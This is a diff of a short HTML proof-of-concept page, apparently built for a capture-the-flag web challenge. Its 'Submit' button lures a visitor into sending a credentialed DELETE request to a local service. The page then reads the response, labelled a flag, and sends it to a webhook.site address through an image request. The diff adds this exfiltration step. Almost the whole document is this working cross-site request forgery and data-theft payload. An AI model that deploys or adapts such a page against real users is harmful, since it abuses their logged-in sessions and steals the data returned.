@@ -1,23 +1,25 @@
 <!doctype html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>poc</title>
-</head>
+<head><meta charset="utf-8"><title>poc</title></head>
 <body>
   <button id="go">Submit</button>
   <script>
-    async function go() {
+    document.getElementById('go').addEventListener('click', async () => {
       try {
-        await fetch('http://127.0.0.1:3000/reach_nirvana', {
+        const r = await fetch('http://127.0.0.1:3000/reach_nirvana', {
           method: 'DELETE',
-          credentials: 'include'
+          credentials: 'include',
         });
-      } catch (e) {}
-      // Optional: signal completion to your infra/logs
-      setTimeout(() => location.href = 'https://example.com/done', 500);
-    }
-    document.getElementById('go').addEventListener('click', go);
+        const flag = await r.text();
+        // send flag to your server (adjust path)
+        (new Image()).src = 'https://webhook.site/2c8771d5-e4a6-46a9-920e-779f60801182/collect?f=' + encodeURIComponent(flag);
+        // also set title as a backup
+        document.title = flag;
+      } catch (e) {
+        // fallback signal so you know the click happened
+        (new Image()).src = 'https://webhook.site/2c8771d5-e4a6-46a9-920e-779f60801182/collect?f=err';
+      }
+    });
   </script>
 </body>
 </html>
